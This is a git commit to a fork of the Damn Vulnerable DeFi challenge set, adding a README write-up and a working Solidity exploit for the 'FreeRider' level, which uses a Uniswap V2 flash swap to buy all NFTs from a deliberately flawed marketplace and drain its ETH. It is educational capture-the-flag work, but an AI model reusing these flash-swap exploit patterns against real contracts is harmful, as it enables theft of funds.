694675716d8fed05b45ea808f7e998dc80241a0b
Ying Quan Tan <ying.quan.tan@gmail.com>
2024-03-26 21:36:32 -0400

    Finished FreeRider

--- README.md
+++ README.md
@@ -5,25 +5,25 @@ A fork of https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry
 
 ## Level 1 : Unstoppable
 
-UnstoppableLender assumes that poolBalance is held in sync with the balance of its address in the ERC20 token, and 
-reverts the transaction if this guard is not met. To break the contract, attacker transfers tokens to the lender 
+UnstoppableLender assumes that poolBalance is held in sync with the balance of its address in the ERC20 token, and
+reverts the transaction if this guard is not met. To break the contract, attacker transfers tokens to the lender
 contract outside of the depositTokens method.
 
 ## Level 2 : NaiveReceiver
 
-NaiveReceiver doesn't check that the borrower is not the message sender, and therefore the attacker can borrow on the 
+NaiveReceiver doesn't check that the borrower is not the message sender, and therefore the attacker can borrow on the
 victim contract's behalf, draining the contract balance.
 
 
 ## Level 3 : Truster
 
-The suspcicious line in this contract is the functionCall in TrusterLenderPool. Since the target address can be 
-specified, a malicious actor can act in the capacity of the borrowing contract. This can then be used to approve the 
+The suspcicious line in this contract is the functionCall in TrusterLenderPool. Since the target address can be
+specified, a malicious actor can act in the capacity of the borrowing contract. This can then be used to approve the
 transfer of ERC20 tokens to a target account, which is the exploit that drains the pool.
 
 ## Level 4 : Side Entrance
 
-This exploit is reminiscent of The UnstoppableLender contract, where there is a discrepancy between an internal 
+This exploit is reminiscent of The UnstoppableLender contract, where there is a discrepancy between an internal
 'balances' variable and the remaining ether in an account.
 
 ## Level 5 : Rewarder
@@ -32,31 +32,44 @@ This seems more like a 'legal' exploit, leveraging a flashloan to gain get a con
 
 ## Level 6 : Selfie
 
-Another flashloan like hack, but with a level of indirection. The pool is restricted by actions only by the governance 
+Another flashloan like hack, but with a level of indirection. The pool is restricted by actions only by the governance
 contract. A flashloan allows the attacker to get enough governance tokens to control the pool.
 
 ## Level 7 : Compromised
 
-Not immediately clear how to backtrack keys from the web response, but eventually used some python to extract a private 
+Not immediately clear how to backtrack keys from the web response, but eventually used some python to extract a private
 key looking string, and using python utils, converted that to an appropriatte uint256 format.
 
-The exploit then involved resetting the price of a token using the trusted oracles, buying, then reselling again after 
+The exploit then involved resetting the price of a token using the trusted oracles, buying, then reselling again after
 resetting the price.
 
 
 ## Level 8 : Puppet
 
-The crux of this vulnerability is that the 'Oracle' source for a smart contract becomes an unguarded, ignored dependency 
-- in this case, the old UniswapV1 endpoint which people seems to have forgotten. Crypto projects expect efficient 
-markets, and in this case this was not the case. By manipulating the price of the dependency, the main project was 
-compomised to yield an unusually low lending rate - in this case, from 1e23 DVT = 2e23 wei to 1e23 DVT = 1.9e19 wei. The 
+The crux of this vulnerability is that the 'Oracle' source for a smart contract becomes an unguarded, ignored dependency
+- in this case, the old UniswapV1 endpoint which people seems to have forgotten. Crypto projects expect efficient
+markets, and in this case this was not the case. By manipulating the price of the dependency, the main project was
+compomised to yield an unusually low lending rate - in this case, from 1e23 DVT = 2e23 wei to 1e23 DVT = 1.9e19 wei. The
 swap was at 100 DVT = 9.9e1 wei before, and after depositing DVT into the swap, 100 DVT = 0e0 wei.
-
 
 
 ## Level 9 : PuppetV2
 
-This exploit is similar to the previous one, in this case manipulating a Uniswap Pair's reserve ratio to then allow a 
-favorable borrowing rate. The attacker swaps his available DVT for WETH, putting more DVT into the Swap Pair, diluting 
+This exploit is similar to the previous one, in this case manipulating a Uniswap Pair's reserve ratio to then allow a
+favorable borrowing rate. The attacker swaps his available DVT for WETH, putting more DVT into the Swap Pair, diluting
 DVT. In return, attacker gets even more WETH that they can use to borrow.
+
+## Level 10 : FreeRider
+
+This is by far the most awkward contract of all. FreeRiderNFTMarketplace.sol actually has 2 vulnerabilities, one of
+which is only really exploited for the purposes of the test. The exploited vulnerability is that the marketplace
+contract ends up paying the _buyer_ of the NFT instead of the seller. This allows the buyer, if they came up with enough
+initial capital, to make a free purchase. The other vulnerability is that the contract only charges the
+max(price1,price2..., priceN) of the N tokens, as opposed to sum(price1, price2...priceN).
+
+The 'Buyer' contract which recovers the NFTs are set up only to accept the NFTs from the attacker, which makes sense,
+but it makes it so that the contract itself cannot pay back uniswap in the flash swap by itself. What might make more
+sense is for the white hat to supply an address that can receive payout - but perhaps this is too much to think about if
+you are really getting hacked.
+
 
--- test/Levels/free-rider/FreeRider.t.sol
+++ test/Levels/free-rider/FreeRider.t.sol
@@ -9,8 +9,13 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
+import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
+import {Address} from "openzeppelin-contracts/utils/Address.sol";
 
-contract FreeRider is Test {
+contract FreeRider is Test, IERC721Receiver, ReentrancyGuard {
+    using Address for address payable;
+
     // The NFT marketplace will have 6 tokens, at 15 ETH each
     uint256 internal constant NFT_PRICE = 15 ether;
     uint8 internal constant AMOUNT_OF_NFTS = 6;
@@ -36,20 +41,31 @@ contract FreeRider is Test {
     address payable internal attacker;
     address payable internal deployer;
 
+    uint256 priceToPay = 15 ether + 1;
+
     function setUp() public {
         /**
          * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
          */
-        buyer = payable(address(uint160(uint256(keccak256(abi.encodePacked("buyer"))))));
+        buyer = payable(
+            address(uint160(uint256(keccak256(abi.encodePacked("buyer")))))
+        );
         vm.label(buyer, "buyer");
         vm.deal(buyer, BUYER_PAYOUT);
 
-        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
+        deployer = payable(
+            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
+        );
         vm.label(deployer, "deployer");
-        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);
+        vm.deal(
+            deployer,
+            UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE
+        );
 
         // Attacker starts with little ETH balance
-        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
+        attacker = payable(
+            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
+        );
         vm.label(attacker, "Attacker");
         vm.deal(attacker, 0.5 ether);
 
@@ -63,12 +79,17 @@ contract FreeRider is Test {
         vm.label(address(dvt), "DVT");
 
         // Deploy Uniswap Factory and Router
-        uniswapV2Factory =
-            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));
+        uniswapV2Factory = IUniswapV2Factory(
+            deployCode(
+                "./src/build-uniswap/v2/UniswapV2Factory.json",
+                abi.encode(address(0))
+            )
+        );
 
         uniswapV2Router = IUniswapV2Router02(
             deployCode(
-                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
+                "./src/build-uniswap/v2/UniswapV2Router02.json",
+                abi.encode(address(uniswapV2Factory), address(weth))
             )
         );
 
@@ -85,7 +106,9 @@ contract FreeRider is Test {
         );
 
         // Get a reference to the created Uniswap pair
-        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));
+        uniswapV2Pair = IUniswapV2Pair(
+            uniswapV2Factory.getPair(address(dvt), address(weth))
+        );
 
         assertEq(uniswapV2Pair.token0(), address(dvt));
         assertEq(uniswapV2Pair.token1(), address(weth));
@@ -101,11 +124,14 @@ contract FreeRider is Test {
             assertEq(damnValuableNFT.ownerOf(id), deployer);
         }
 
-        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);
+        damnValuableNFT.setApprovalForAll(
+            address(freeRiderNFTMarketplace),
+            true
+        );
 
         uint256[] memory NFTsForSell = new uint256[](6);
         uint256[] memory NFTsPrices = new uint256[](6);
-        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
+        for (uint8 i = 0; i < AMOUNT_OF_NFTS; ) {
             NFTsForSell[i] = i;
             NFTsPrices[i] = NFT_PRICE;
             unchecked {
@@ -130,18 +156,115 @@ contract FreeRider is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    function uniswapV2Call(
+        address,
+        uint256,
+        uint256 _amount1,
+        bytes calldata
+    ) public payable {
+        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
+        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
+        assert(msg.sender == uniswapV2Factory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
+
+        // at this point, uniswap should have transfered the total amount to us.
+        // + 1 here to avoid rounding errors
+        uint256 repayment = ((_amount1 + 1) * 1000) / 997;
+        console.log(
+            "weth balance after transfer = %e, to refund = %e",
+            weth.balanceOf(address(this)),
+            repayment
+        );
+        // to repay: 9.027e19
+        // contract balance 1.55e19
+
+        // disspointing that there isn't a better way to read private contract storage.
+        // but even if that was possible, there is no way to loop through the map to obtain
+        // tokenIds.
+        //  tokenIds = [uint256(0), 1, 2, 3, 4, 5]; // could have also done this
+        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
+        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            tokenIds[tokenId] = tokenId;
+        }
+
+        // nft marketplace takes eth, so we convert weth to eth
+        weth.withdraw(weth.balanceOf(address(this)));
+        console.log("contract balance= %e", address(this).balance);
+
+        // priceToPay is simply the cost of one nft + 1
+        freeRiderNFTMarketplace.buyMany{value: NFT_PRICE}(tokenIds);
+
+        // we need to repay uniswap with interest
+        weth.deposit{value: repayment}();
+        weth.transfer(msg.sender, repayment);
+
+        // send the balance back to the attacker
+        attacker.sendValue(address(this).balance);
+    }
+
+    receive() external payable {}
+
+    fallback() external payable {}
+
+    function onERC721Received(
+        address,
+        address,
+        uint256 _tokenId,
+        bytes memory
+    ) external override nonReentrant returns (bytes4) {
+        require(msg.sender == address(damnValuableNFT));
+        require(_tokenId >= 0 && _tokenId <= 5);
+        require(damnValuableNFT.ownerOf(_tokenId) == address(this));
+
+        require(tx.origin == attacker);
+
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+
+        // make sure smart contract has no balance
+        vm.deal(address(this), 0);
+        require(weth.balanceOf(address(this)) == 0);
+
+        // allow attacker to manage any nft movements
+        damnValuableNFT.setApprovalForAll(address(attacker), true);
+
         vm.startPrank(attacker, attacker);
 
+        // start by transfering eth to the smart contract
+        uint256 startBalance = attacker.balance;
+        weth.deposit{value: startBalance}();
+        weth.transfer(address(this), startBalance);
+
+        console.log(
+            "weth balance before starttransfer = %e",
+            weth.balanceOf(address(this))
+        );
+
+        // 0 is the junk byte at the end, we don't use calldata
+        // in flash swap, don't call router, call the pair directly.
+        // amount0 can be ignored. amount1 will be returned in the flash swap
+        uniswapV2Pair.swap(0, NFT_PRICE, address(this), "0");
+
+        // ok now we own everything, transfer them over:
+        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            damnValuableNFT.safeTransferFrom(
+                address(this),
+                address(freeRiderBuyer),
+                tokenId
+            );
+        }
         vm.stopPrank();
         /**
          * EXPLOIT END *
          */
         validation();
-        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        console.log(
+            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
+        );
     }
 
     function validation() internal {
@@ -156,13 +279,20 @@ contract FreeRider is Test {
         // The buyer extracts all NFTs from its associated contract
         vm.startPrank(buyer);
         for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
-            damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
+            damnValuableNFT.transferFrom(
+                address(freeRiderBuyer),
+                buyer,
+                tokenId
+            );
             assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
         }
         vm.stopPrank();
 
         // Exchange must have lost NFTs and ETH
         assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
-        assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
+        assertLt(
+            address(freeRiderNFTMarketplace).balance,
+            MARKETPLACE_INITIAL_ETH_BALANCE
+        );
     }
 }
